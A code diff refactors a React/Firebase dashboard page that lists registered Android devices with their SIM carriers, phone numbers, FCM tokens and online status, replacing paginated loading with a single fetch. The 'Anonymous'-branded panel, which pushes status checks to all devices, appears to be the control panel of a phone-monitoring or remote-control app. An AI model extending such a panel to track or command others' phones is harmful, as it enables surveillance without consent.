@@ -8,19 +8,12 @@ import { db } from "@/lib/firbase";
 import LineSpinner from "@/components/LineSpinner";
 import {
   get,
-  limitToFirst,
-  onChildAdded,
   onChildChanged,
   onChildRemoved,
-  orderByKey,
-  query,
   ref,
-  startAt,
 } from "firebase/database";
-import { useCallback, useEffect, useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 
-const INITIAL_PAGE_SIZE = 20;
-const NEXT_PAGE_SIZE = 10;
 const CHECKONLINE_SYNC_INTERVAL_MS = 5 * 60 * 1000;
 
 type CheckOnlineRecord = Record<string, unknown>;
@@ -29,25 +22,19 @@ function normalizeJoinedAt(value: unknown): string {
   if (typeof value === "number" && Number.isFinite(value) && value > 0) {
     return new Date(value).toISOString();
   }
-
   if (typeof value === "string") {
     const trimmed = value.trim();
-
     if (trimmed) {
       const numericValue = Number(trimmed);
-
       if (Number.isFinite(numericValue) && numericValue > 0) {
         return new Date(numericValue).toISOString();
       }
-
       const parsedDate = Date.parse(trimmed);
-
       if (!Number.isNaN(parsedDate)) {
         return new Date(parsedDate).toISOString();
       }
     }
   }
-
   return new Date(0).toISOString();
 }
 
@@ -55,52 +42,38 @@ function normalizeCheckedAt(value: unknown): string {
   if (typeof value === "number" && Number.isFinite(value) && value > 0) {
     return new Date(value).toISOString();
   }
-
   if (typeof value === "string") {
     const trimmed = value.trim();
-
-    if (!trimmed) {
-      return "";
-    }
-
+    if (!trimmed) return "";
     const numericValue = Number(trimmed);
-
     if (Number.isFinite(numericValue) && numericValue > 0) {
       return new Date(numericValue).toISOString();
     }
-
     const parsedDate = Date.parse(trimmed);
-
     if (!Number.isNaN(parsedDate)) {
       return new Date(parsedDate).toISOString();
     }
   }
-
   return "";
 }
 
 function getRegisteredCheckOnline(
-  rawData: Record<string, unknown>,
+  rawData: Record<string, unknown>
 ): CheckOnlineRecord | undefined {
   const nestedCheckOnline = rawData.checkOnline;
-
   return nestedCheckOnline && typeof nestedCheckOnline === "object"
     ? (nestedCheckOnline as CheckOnlineRecord)
     : undefined;
 }
 
 function getOnlineStatus(
-  checkOnline?: CheckOnlineRecord,
+  checkOnline?: CheckOnlineRecord
 ): Device["onlineStatus"] {
   return getDeviceStatusFromAvailability(checkOnline?.available);
 }
 
-function mapToDevice(
-  deviceId: string,
-  rawData: Record<string, unknown>,
-): Device {
+function mapToDevice(deviceId: string, rawData: Record<string, unknown>): Device {
   const checkOnline = getRegisteredCheckOnline(rawData);
-
   return {
     deviceId,
     model: typeof rawData.model === "string" ? rawData.model : "Unknown",
@@ -114,58 +87,30 @@ function mapToDevice(
     fcmToken: typeof rawData.fcmToken === "string" ? rawData.fcmToken : "",
     adminPhoneNumber: [],
     manufacturer:
-      typeof rawData.manufacturer === "string"
-        ? rawData.manufacturer
-        : "Unknown",
-    sim1Carrier:
-      typeof rawData.sim1Carrier === "string" ? rawData.sim1Carrier : "",
-    sim1number:
-      typeof rawData.sim1Number === "string" ? rawData.sim1Number : "",
-    sim2Carrier:
-      typeof rawData.sim2Carrier === "string" ? rawData.sim2Carrier : "",
-    sim2number:
-      typeof rawData.sim2Number === "string" ? rawData.sim2Number : "",
+      typeof rawData.manufacturer === "string" ? rawData.manufacturer : "Unknown",
+    sim1Carrier: typeof rawData.sim1Carrier === "string" ? rawData.sim1Carrier : "",
+    sim1number: typeof rawData.sim1Number === "string" ? rawData.sim1Number : "",
+    sim2Carrier: typeof rawData.sim2Carrier === "string" ? rawData.sim2Carrier : "",
+    sim2number: typeof rawData.sim2Number === "string" ? rawData.sim2Number : "",
     onlineStatus: getOnlineStatus(checkOnline),
     lastChecked: normalizeCheckedAt(
-      checkOnline?.checkedAt ?? checkOnline?.lastChecked,
+      checkOnline?.checkedAt ?? checkOnline?.lastChecked
     ),
     isfavorite: Boolean(rawData.isfavorite),
   };
 }
 
 function formatLastChecked(value: string): string {
-  if (!value) {
-    return "N/A";
-  }
-
+  if (!value) return "N/A";
   const checkedTime = new Date(value).getTime();
-
-  if (Number.isNaN(checkedTime)) {
-    return "N/A";
-  }
-
+  if (Number.isNaN(checkedTime)) return "N/A";
   const diffMs = Date.now() - checkedTime;
-
-  if (diffMs < 0) {
-    return "just now";
-  }
-
+  if (diffMs < 0) return "just now";
   const minutes = Math.floor(diffMs / (1000 * 60));
-
-  if (minutes < 1) {
-    return "just now";
-  }
-
-  if (minutes < 60) {
-    return `${minutes}m ago`;
-  }
-
+  if (minutes < 1) return "just now";
+  if (minutes < 60) return `${minutes}m ago`;
   const hours = Math.floor(minutes / 60);
-
-  if (hours < 24) {
-    return `${hours}h ago`;
-  }
-
+  if (hours < 24) return `${hours}h ago`;
   const days = Math.floor(hours / 24);
   return `${days}d ago`;
 }
@@ -173,304 +118,108 @@ function formatLastChecked(value: string): string {
 function getPrimarySimLine(device: Device): string {
   const sim1 = [device.sim1Carrier, device.sim1number].filter(Boolean).join(" -- ");
   const sim2 = [device.sim2Carrier, device.sim2number].filter(Boolean).join(" -- ");
-
-  if (sim1) {
-    return `SIM 1: ${sim1}`;
-  }
-
-  if (sim2) {
-    return `SIM 2: ${sim2}`;
-  }
-
+  if (sim1) return `SIM 1: ${sim1}`;
+  if (sim2) return `SIM 2: ${sim2}`;
   return "SIM: N/A";
 }
 
 export default function DevicesPage() {
   const [devices, setDevices] = useState<Device[]>([]);
   const [searchQuery, setSearchQuery] = useState("");
-  const [loading, setLoading] = useState(false);
-  const [initialLoading, setInitialLoading] = useState(true);
-  const [hasMore, setHasMore] = useState(true);
-  const [lastKey, setLastKey] = useState<string | null>(null);
+  const [loading, setLoading] = useState(true);
   const [activeOnly, setActiveOnly] = useState(false);
-  const loaderRef = useRef<HTMLDivElement | null>(null);
-  const loadingRef = useRef(false);
-  const hasMoreRef = useRef(true);
-  const lastKeyRef = useRef<string | null>(null);
   const pathname = usePathname();
   const router = useRouter();
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [checkAllLoading, setCheckAllLoading] = useState(false);
 
-  const loadDevices = useCallback(async (batchSize: number) => {
-    if (loadingRef.current || !hasMoreRef.current) return;
-
-    loadingRef.current = true;
-    setLoading(true);
-
-    try {
-      const devicesRef = ref(db, "registeredDevices");
-
-      const cursor = lastKeyRef.current;
-
-      const pagedQuery = cursor
-        ? query(
-            devicesRef,
-            orderByKey(),
-            startAt(cursor),
-            limitToFirst(batchSize + 1),
-          )
-        : query(devicesRef, orderByKey(), limitToFirst(batchSize));
-
-      const devicesSnapshot = await get(pagedQuery);
-
-      if (!devicesSnapshot.exists()) {
-        hasMoreRef.current = false;
-        setHasMore(false);
-        return;
+  // Load all devices once on mount
+  useEffect(() => {
+    const fetchAllDevices = async () => {
+      setLoading(true);
+      try {
+        const devicesRef = ref(db, "registeredDevices");
+        const snapshot = await get(devicesRef);
+        if (snapshot.exists()) {
+          const allDevices: Device[] = [];
+          snapshot.forEach((child) => {
+            const deviceId = child.key;
+            const deviceData = child.val();
+            if (deviceId && deviceData) {
+              allDevices.push(mapToDevice(deviceId, deviceData));
+            }
+          });
+          setDevices(allDevices);
+        } else {
+          setDevices([]);
+        }
+      } catch (error) {
+        console.error("Failed to load devices:", error);
+      } finally {
+        setLoading(false);
       }
-
-      const fetchedDevices: Device[] = [];
-
-      devicesSnapshot.forEach((childSnapshot) => {
-        const deviceId = childSnapshot.key;
-        const deviceData = childSnapshot.val();
-
-        if (!deviceId || !deviceData) return;
-
-        const device = mapToDevice(deviceId, deviceData);
-
-        fetchedDevices.push(device);
-      });
-
-      const nextBatch = cursor
-        ? fetchedDevices.filter((d) => d.deviceId !== cursor)
-        : fetchedDevices;
-
-      if (nextBatch.length === 0) {
-        hasMoreRef.current = false;
-        setHasMore(false);
-        return;
-      }
-
-      setDevices((prev) => {
-        const existingIds = new Set(prev.map((d) => d.deviceId));
-
-        const uniqueNew = nextBatch.filter((d) => !existingIds.has(d.deviceId));
-
-        return [...prev, ...uniqueNew];
-      });
-
-      const nextLastKey = nextBatch[nextBatch.length - 1]?.deviceId;
-
-      if (nextLastKey) {
-        lastKeyRef.current = nextLastKey;
-        setLastKey(nextLastKey);
-      }
-
-      if (nextBatch.length < batchSize) {
-        hasMoreRef.current = false;
-        setHasMore(false);
-      }
-    } catch (error) {
-      console.error("Failed to fetch devices", error);
-    } finally {
-      loadingRef.current = false;
-      setLoading(false);
-      setInitialLoading(false);
-    }
+    };
+    fetchAllDevices();
   }, []);
 
-  useEffect(() => {
-    void loadDevices(INITIAL_PAGE_SIZE);
-  }, [loadDevices]);
-
-  useEffect(() => {
-    const observer = new IntersectionObserver(
-      (entries) => {
-        const [entry] = entries;
-
-        if (
-          !entry?.isIntersecting ||
-          loadingRef.current ||
-          !hasMoreRef.current
-        ) {
-          return;
-        }
-
-        void loadDevices(NEXT_PAGE_SIZE);
-      },
-      {
-        root: null,
-        rootMargin: "0px 0px 240px 0px",
-        threshold: 0,
-      },
-    );
-
-    const currentLoader = loaderRef.current;
-
-    if (currentLoader) {
-      observer.observe(currentLoader);
-    }
-
-    return () => {
-      if (currentLoader) {
-        observer.unobserve(currentLoader);
-      }
-      observer.disconnect();
-    };
-  }, [loadDevices]);
-
+  // Real-time updates
   useEffect(() => {
     const devicesRef = ref(db, "registeredDevices");
-
     const unsubscribeChanged = onChildChanged(devicesRef, (snapshot) => {
       const childKey = snapshot.key;
       const childValue = snapshot.val();
-
-      if (!childKey || !childValue || typeof childValue !== "object") {
-        return;
-      }
-
-      const updatedDevice = mapToDevice(
-        childKey,
-        childValue as Record<string, unknown>,
+      if (!childKey || !childValue || typeof childValue !== "object") return;
+      const updatedDevice = mapToDevice(childKey, childValue as Record<string, unknown>);
+      setDevices((prev) =>
+        prev.map((d) => (d.deviceId === childKey ? updatedDevice : d))
       );
-
-      setDevices((prevDevices) => {
-        const deviceIndex = prevDevices.findIndex(
-          (device) => device.deviceId === childKey,
-        );
-
-        if (deviceIndex < 0) {
-          return prevDevices;
-        }
-
-        const nextDevices = [...prevDevices];
-        nextDevices[deviceIndex] = updatedDevice;
-        return nextDevices;
-      });
     });
-
     const unsubscribeRemoved = onChildRemoved(devicesRef, (snapshot) => {
       const childKey = snapshot.key;
-
-      if (!childKey) {
-        return;
-      }
-
-      setDevices((prevDevices) =>
-        prevDevices.filter((device) => device.deviceId !== childKey),
-      );
+      if (!childKey) return;
+      setDevices((prev) => prev.filter((d) => d.deviceId !== childKey));
     });
-
     return () => {
       unsubscribeChanged();
       unsubscribeRemoved();
     };
   }, []);
 
-  useEffect(() => {
-    hasMoreRef.current = hasMore;
-  }, [hasMore]);
-
-  useEffect(() => {
-    lastKeyRef.current = lastKey;
-  }, [lastKey]);
-
-  useEffect(() => {
-    if (hasMore || !lastKey) {
-      return;
-    }
-
-    const devicesRef = ref(db, "registeredDevices");
-    const tailQuery = query(devicesRef, orderByKey(), startAt(lastKey));
-
-    const unsubscribeAdded = onChildAdded(tailQuery, (snapshot) => {
-      const childKey = snapshot.key;
-      const childValue = snapshot.val();
-
-      if (
-        !childKey ||
-        childKey === lastKey ||
-        !childValue ||
-        typeof childValue !== "object"
-      ) {
-        return;
-      }
-
-      const appendedDevice = mapToDevice(
-        childKey,
-        childValue as Record<string, unknown>,
-      );
-
-      setDevices((prevDevices) => {
-        if (prevDevices.some((device) => device.deviceId === childKey)) {
-          return prevDevices;
-        }
-
-        return [...prevDevices, appendedDevice];
-      });
-
-      if (childKey.localeCompare(lastKeyRef.current ?? "") > 0) {
-        lastKeyRef.current = childKey;
-        setLastKey(childKey);
-      }
-    });
-
-    return () => unsubscribeAdded();
-  }, [hasMore, lastKey]);
-
+  // Periodic background sync
   useEffect(() => {
     let isCancelled = false;
-
     const syncStaleOfflineDevices = async () => {
       try {
         const response = await fetch("/api/checkonline-maintenance", {
           method: "POST",
           cache: "no-store",
         });
-
-        if (!response.ok && !isCancelled) {
-          console.error("checkOnline maintenance request failed");
-        }
+        if (!response.ok && !isCancelled) console.error("checkOnline maintenance failed");
       } catch (error) {
-        if (!isCancelled) {
-          console.error("Failed to trigger checkOnline maintenance", error);
-        }
+        if (!isCancelled) console.error("Failed to trigger checkOnline maintenance", error);
       }
     };
-
     void syncStaleOfflineDevices();
-
-    const intervalId = window.setInterval(() => {
-      void syncStaleOfflineDevices();
-    }, CHECKONLINE_SYNC_INTERVAL_MS);
-
+    const intervalId = setInterval(() => void syncStaleOfflineDevices(), CHECKONLINE_SYNC_INTERVAL_MS);
     return () => {
       isCancelled = true;
-      window.clearInterval(intervalId);
+      clearInterval(intervalId);
     };
   }, []);
 
-  // Check if device is active (last seen within 15 minutes)
   const isDeviceActive = (device: Device): boolean => {
     if (!device.lastChecked) return false;
     const lastCheckedTime = new Date(device.lastChecked).getTime();
     if (isNaN(lastCheckedTime)) return false;
-    const now = Date.now();
-    const fifteenMinutes = 15 * 60 * 1000;
-    return (now - lastCheckedTime) <= fifteenMinutes;
+    return Date.now() - lastCheckedTime <= 15 * 60 * 1000;
   };
 
-  // Count of active devices (based on full device list)
-  const activeCount = useMemo(() => {
-    return devices.filter(isDeviceActive).length;
-  }, [devices]);
+  const activeCount = useMemo(() => devices.filter(isDeviceActive).length, [devices]);
 
-  const normalizedQuery = searchQuery.trim().toLowerCase();
-  const filteredDevices = useMemo(() => {
-    let result = devices;
+  // Filter and sort: newest first (joinedAt descending)
+  const filteredAndSortedDevices = useMemo(() => {
+    let result = [...devices];
+    const normalizedQuery = searchQuery.trim().toLowerCase();
     if (normalizedQuery) {
       result = result.filter((device) => {
         const searchableText = [
@@ -486,20 +235,15 @@ export default function DevicesPage() {
         ]
           .join(" ")
           .toLowerCase();
-
         return searchableText.includes(normalizedQuery);
       });
     }
     if (activeOnly) {
       result = result.filter(isDeviceActive);
     }
+    result.sort((a, b) => b.joinedAt.localeCompare(a.joinedAt));
     return result;
   }, [devices, searchQuery, activeOnly]);
-
-  // Reverse the filtered devices so newest appears first (top)
-  const reversedDevices = useMemo(() => {
-    return [...filteredDevices].reverse();
-  }, [filteredDevices]);
 
   const sendFCMAction = async (device: Device, endpoint: string, loadingKey?: string) => {
     const key = loadingKey || endpoint;
@@ -516,14 +260,8 @@ export default function DevicesPage() {
         }),
       });
       const data = await res.json();
-      if (data.success) {
-        return true;
-      } else {
-        console.warn(`Check status failed for ${device.deviceId}: ${data.error}`);
-        return false;
-      }
+      return data.success === true;
     } catch {
-      console.error(`Network error sending check status to ${device.deviceId}`);
       return false;
     } finally {
       setActionLoading(null);
@@ -531,45 +269,23 @@ export default function DevicesPage() {
   };
 
   const handleCheckAll = async () => {
-    if (checkAllLoading) return;
-    if (!filteredDevices.length) {
-      alert("No devices to check");
-      return;
-    }
-
-    const confirmMsg = `This will send a status check to ${filteredDevices.length} device(s). Continue?`;
-    if (!confirm(confirmMsg)) return;
-
+    if (checkAllLoading || filteredAndSortedDevices.length === 0) return;
+    if (!confirm(`Send status check to ${filteredAndSortedDevices.length} device(s)?`)) return;
     setCheckAllLoading(true);
-    let successCount = 0;
-    let failCount = 0;
-
-    for (let i = 0; i < filteredDevices.length; i++) {
-      const device = filteredDevices[i];
-      try {
-        setActionLoading(`check-${device.deviceId}`);
-        const result = await sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
-        if (result) successCount++;
-        else failCount++;
-      } catch (error) {
-        failCount++;
-      } finally {
-        setActionLoading(null);
-      }
-      await new Promise(resolve => setTimeout(resolve, 300));
+    let successCount = 0,
+      failCount = 0;
+    for (const device of filteredAndSortedDevices) {
+      const ok = await sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
+      if (ok) successCount++;
+      else failCount++;
+      await new Promise((resolve) => setTimeout(resolve, 300));
     }
-
     setCheckAllLoading(false);
-    alert(`Check all complete: ${successCount} succeeded, ${failCount} failed.`);
+    alert(`Complete: ${successCount} succeeded, ${failCount} failed.`);
   };
 
   const handleCardClick = (deviceId: string) => {
-    if (!deviceId || deviceId === "Unknown") {
-      return;
-    }
-    
-    const url = `/devices/${deviceId}`;
-    window.open(url, '_blank');
+    if (deviceId && deviceId !== "Unknown") window.open(`/devices/${deviceId}`, "_blank");
   };
 
   return (
@@ -579,7 +295,6 @@ export default function DevicesPage() {
           <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d] shrink-0">
             Anonymous
           </Link>
-          {/* Nav: horizontal scroll on small screens, no wrapping */}
           <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Home
@@ -608,12 +323,14 @@ export default function DevicesPage() {
         </div>
       </header>
 
-      {initialLoading ? (
-        <LineSpinner />
+      {loading ? (
+        // Loader centered in main area (header stays visible)
+        <div className="flex min-h-[calc(100vh-80px)] items-center justify-center">
+          <LineSpinner />
+        </div>
       ) : (
         <main className="mx-auto w-full max-w-3xl px-5 py-8">
           <div className="space-y-5 rounded-[14px] border border-gray-300 bg-gray-100 p-5">
-            {/* First row: dropdown and Check All */}
             <div className="flex items-center gap-3">
               <select
                 aria-label="Filter devices"
@@ -636,7 +353,6 @@ export default function DevicesPage() {
               </button>
             </div>
 
-            {/* Second row: search input and Active button with count */}
             <div className="flex items-center gap-3">
               <div className="relative flex-1">
                 <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-gray-500">
@@ -664,32 +380,38 @@ export default function DevicesPage() {
             </div>
           </div>
 
-          {/* Card grid remains side-by-side: grid-cols-2 */}
           <div className="mt-8 grid grid-cols-2 gap-5">
-            {reversedDevices.map((device, index) => {
-              const serialNumber = filteredDevices.length - index;
-              const onlineColorClass = isDeviceActive(device) ? "text-green-500" : "text-red-500";
+            {filteredAndSortedDevices.map((device, idx) => {
+              const serialNumber = filteredAndSortedDevices.length - idx;
+              const isActive = isDeviceActive(device);
+              const onlineColorClass = isActive ? "text-green-500" : "text-red-500";
               return (
                 <div
                   key={device.deviceId}
                   onClick={() => handleCardClick(device.deviceId)}
-                  style={{ cursor: 'pointer' }}
+                  style={{ cursor: "pointer" }}
                   className="flex flex-col border border-gray-300 bg-white rounded-lg p-4"
                 >
                   <h2 className="mb-3 text-center text-sm font-bold leading-tight text-blue-700">
                     {serialNumber}. {device.brand} {device.model} ({device.androidVersion})
                   </h2>
-
                   <div className="flex-1 overflow-hidden border border-gray-300 bg-gray-50 text-center text-xs font-semibold text-gray-700 rounded">
-                    <div className="px-3 py-2 break-all border-b border-gray-300">{device.brand} {device.model}</div>
-                    <div className="px-3 py-2 break-all border-b border-gray-300">ID: {device.deviceId}</div>
-                    <div className="px-3 py-2 border-b border-gray-300">Android: {device.androidVersion}</div>
-                    <div className="px-3 py-2 border-b border-gray-300">{getPrimarySimLine(device)}</div>
+                    <div className="px-3 py-2 break-all border-b border-gray-300">
+                      {device.brand} {device.model}
+                    </div>
+                    <div className="px-3 py-2 break-all border-b border-gray-300">
+                      ID: {device.deviceId}
+                    </div>
+                    <div className="px-3 py-2 border-b border-gray-300">
+                      Android: {device.androidVersion}
+                    </div>
+                    <div className="px-3 py-2 border-b border-gray-300">
+                      {getPrimarySimLine(device)}
+                    </div>
                     <div className="px-3 py-2">
                       online: <span className={onlineColorClass}>{formatLastChecked(device.lastChecked)}</span>
                     </div>
                   </div>
-
                   <div className="mt-3 flex justify-center">
                     <button
                       type="button"
@@ -707,22 +429,11 @@ export default function DevicesPage() {
               );
             })}
 
-            {loading && (
-              <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500 col-span-2">
-                <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-yellow-500" />
-                <span>Loading more devices...</span>
-              </div>
+            {filteredAndSortedDevices.length === 0 && (
+              <p className="py-6 text-center text-sm text-gray-500 col-span-2">
+                No devices found.
+              </p>
             )}
-
-            {!hasMore && filteredDevices.length > 0 && (
-              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No more devices to load.</p>
-            )}
-
-            {!loading && filteredDevices.length === 0 && devices.length > 0 && (
-              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No devices match your search.</p>
-            )}
-
-            <div ref={loaderRef} className="h-1 w-full col-span-2" />
           </div>
         </main>
       )}
